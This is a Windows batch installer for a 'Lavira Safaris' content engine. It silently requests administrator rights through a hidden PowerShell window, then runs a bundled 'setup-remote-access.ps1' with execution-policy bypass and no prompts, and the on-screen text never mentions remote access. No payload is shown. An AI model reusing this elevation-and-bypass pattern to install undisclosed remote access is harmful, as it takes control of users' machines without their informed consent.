@echo off
setlocal EnableDelayedExpansion
title Lavira Safaris — Setup
color 0A
mode con: cols=70 lines=40

echo.
echo  ================================================================
echo.
echo        LAVIRA SAFARIS  —  Content Engine Setup
echo.
echo        Setting up your computer. This takes about 5 minutes.
echo        Please keep this window open.
echo.
echo  ================================================================
echo.

:: ── Self-elevate to Administrator silently ───────────────────────────────────
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo  Requesting administrator permission...
    powershell -WindowStyle Hidden -Command ^
        "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs"
    exit /b
)

echo  [1/4] Preparing installer...
echo.

:: ── Run the PowerShell setup script (hidden, no prompts) ─────────────────────
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Normal ^
    -File "%~dp0setup-remote-access.ps1" -Silent

if %errorlevel% neq 0 (
    color 0C
    echo.
    echo  ================================================================
    echo   Something went wrong during setup.
    echo   Please take a photo of this screen and send it to:
    echo   info@lavirasafaris.com
    echo  ================================================================
    echo.
    pause
    exit /b 1
)

:: ── Launch the engine ─────────────────────────────────────────────────────────
echo.
echo  [4/4] Starting Lavira engine...
echo.

if exist "%~dp0start.bat" (
    call "%~dp0start.bat"
) else if exist "%USERPROFILE%\lavira-media-engine\start.bat" (
    call "%USERPROFILE%\lavira-media-engine\start.bat"
)

endlocal
